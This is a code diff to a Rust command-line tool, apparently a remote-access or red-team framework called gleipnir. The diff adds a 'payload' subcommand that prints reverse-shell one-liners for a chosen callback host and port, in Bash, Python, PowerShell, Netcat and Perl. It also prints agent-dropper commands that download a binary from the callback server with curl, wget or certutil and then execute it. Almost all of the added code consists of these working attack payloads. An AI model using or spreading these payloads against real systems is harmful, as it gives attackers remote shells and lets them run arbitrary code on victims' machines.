@@ -64,6 +64,24 @@ enum Commands {
         #[arg(short, long, default_value = "raw")]
         mode: String,
     },
+    /// Generate reverse shell one-liners for a target callback
+    Payload {
+        /// Callback IP address
+        #[arg(short = 'H', long)]
+        host: String,
+        /// Callback port
+        #[arg(short, long, default_value_t = 4444)]
+        port: u16,
+        /// API port for agent download URLs
+        #[arg(long, default_value_t = 6666)]
+        api_port: u16,
+        /// Filter to one type: bash, python, powershell, nc, perl, agent
+        #[arg(long)]
+        format: Option<String>,
+        /// Print just the one-liner (for piping to clipboard)
+        #[arg(long)]
+        raw: bool,
+    },
 }
 
 #[tokio::main]
@@ -240,6 +258,15 @@ async fn main() {
             Ok(v) => print_json(&v),
             Err(e) => eprintln!("error: {e}"),
         },
+        Commands::Payload {
+            host,
+            port,
+            api_port,
+            format,
+            raw,
+        } => {
+            print_payloads(&host, port, api_port, format.as_deref(), raw);
+        }
         Commands::Catch { port, mode } => {
             // Requires a running gleipnir-server. Creates a listener and waits for a connection.
             // Full embedded mode (built-in server) is a future enhancement.
@@ -288,4 +315,96 @@ async fn main() {
 
 fn print_json(v: &serde_json::Value) {
     println!("{}", serde_json::to_string_pretty(v).unwrap_or_default());
+}
+
+fn print_payloads(host: &str, port: u16, api_port: u16, format: Option<&str>, raw: bool) {
+    struct Payload {
+        category: &'static str,
+        lines: Vec<String>,
+    }
+
+    let payloads = [
+        Payload {
+            category: "Bash",
+            lines: vec![
+                format!("bash -i >& /dev/tcp/{host}/{port} 0>&1"),
+                format!("bash -c 'bash -i >& /dev/tcp/{host}/{port} 0>&1'"),
+            ],
+        },
+        Payload {
+            category: "Python",
+            lines: vec![
+                format!(
+                    "python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect((\"{host}\",{port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'"
+                ),
+                format!(
+                    "python -c 'import socket,subprocess,os;s=socket.socket();s.connect((\"{host}\",{port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'"
+                ),
+            ],
+        },
+        Payload {
+            category: "PowerShell",
+            lines: vec![format!(
+                "powershell -nop -c \"$c=New-Object Net.Sockets.TCPClient('{host}',{port});$s=$c.GetStream();[byte[]]$b=0..65535|%{{0}};while(($i=$s.Read($b,0,$b.Length)) -ne 0){{$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$r=(iex $d 2>&1|Out-String);$s.Write(([text.encoding]::ASCII.GetBytes($r)),0,$r.Length)}};$c.Close()\""
+            )],
+        },
+        Payload {
+            category: "Netcat",
+            lines: vec![
+                format!("nc -e /bin/sh {host} {port}"),
+                format!(
+                    "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {host} {port} >/tmp/f"
+                ),
+            ],
+        },
+        Payload {
+            category: "Perl",
+            lines: vec![format!(
+                "perl -e 'use Socket;$i=\"{host}\";$p={port};socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));connect(S,sockaddr_in($p,inet_aton($i)));open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");'"
+            )],
+        },
+        Payload {
+            category: "Agent",
+            lines: vec![
+                format!(
+                    "curl http://{host}:{api_port}/api/agents/linux/amd64 -o /tmp/a && chmod +x /tmp/a && /tmp/a -H {host} -p {port} &"
+                ),
+                format!(
+                    "wget -qO /tmp/a http://{host}:{api_port}/api/agents/linux/amd64 && chmod +x /tmp/a && /tmp/a -H {host} -p {port} &"
+                ),
+                format!(
+                    "certutil -urlcache -split -f http://{host}:{api_port}/api/agents/windows/amd64 C:\\Windows\\Temp\\a.exe && C:\\Windows\\Temp\\a.exe -H {host} -p {port}"
+                ),
+            ],
+        },
+    ];
+
+    let filter = format.map(|f| f.to_lowercase());
+    let filtered: Vec<&Payload> = payloads
+        .iter()
+        .filter(|p| match &filter {
+            Some(f) => p.category.to_lowercase() == *f,
+            None => true,
+        })
+        .collect();
+
+    if raw {
+        for p in &filtered {
+            for line in &p.lines {
+                println!("{line}");
+            }
+        }
+        return;
+    }
+
+    println!("=== Reverse Shell Payloads ===");
+    println!("Target: {host}:{port}\n");
+
+    for p in &filtered {
+        println!("-- {} --", p.category);
+        for line in &p.lines {
+            println!("{line}");
+        }
+        println!();
+    }
 }
